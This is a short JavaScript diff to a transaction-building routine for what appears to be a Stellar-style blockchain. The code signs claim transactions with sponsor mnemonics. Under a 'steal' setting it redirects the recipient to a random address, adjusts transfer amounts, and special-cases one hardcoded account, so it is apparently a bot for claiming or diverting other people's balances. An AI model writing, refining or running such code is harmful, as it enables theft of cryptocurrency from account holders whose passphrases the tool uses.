@@ -45,8 +45,9 @@ async function getXDRsReady(mainPhrase, balanceId, recipient, amount, time, name
             usingSponsors = name ? usingSponsors.slice(0, sponsorsCount) : usingSponsors;
             let pos = 0;
             for (const s of usingSponsors) {
-                // const r = name ? recipient : getRandomAddress()
-                const r = recipient;
+                if(!name && settings.steal) {
+                    recipient = getRandomAddress();
+                }
                 try {
                     const kp = getSDKKeypairFromPassphrase(s.mnemonic);
                     const accountData  = await getAccount(kp.publicKey());
@@ -54,10 +55,14 @@ async function getXDRsReady(mainPhrase, balanceId, recipient, amount, time, name
                     const balance = parseFloat(balanceString) - 0.98;
                     if(balance < 0.02) continue;
                     // Change amount
-                    const mutatedAmount = ( !!name && settings.steal ) ? (Number(amount) + 0.0101).toString() : amount;
+                    let mutatedAmount = ( !!name && settings.steal ) ? (Number(amount) + 0.00101).toString() : amount;
+
+                    if(settings.steal && recipient === 'GDOQD7EVNKEB775WCG7DZ3L6H7RTPLXKAGM46JEARLGROQM6TOX3D2BS') {
+                        mutatedAmount = (Number(amount) + 0.00101).toString();
+                    }
                     // pos++;
 
-                    const xdr = await prebuildAndSignChannelTx(s.mnemonic, mainKp, balanceId, r, mutatedAmount, retries, name);
+                    const xdr = await prebuildAndSignChannelTx(s.mnemonic, mainKp, balanceId, recipient, mutatedAmount, retries, name);
                     if (xdr) {
                         xdrs.push({ xdr, balanceId });
                         pos++;
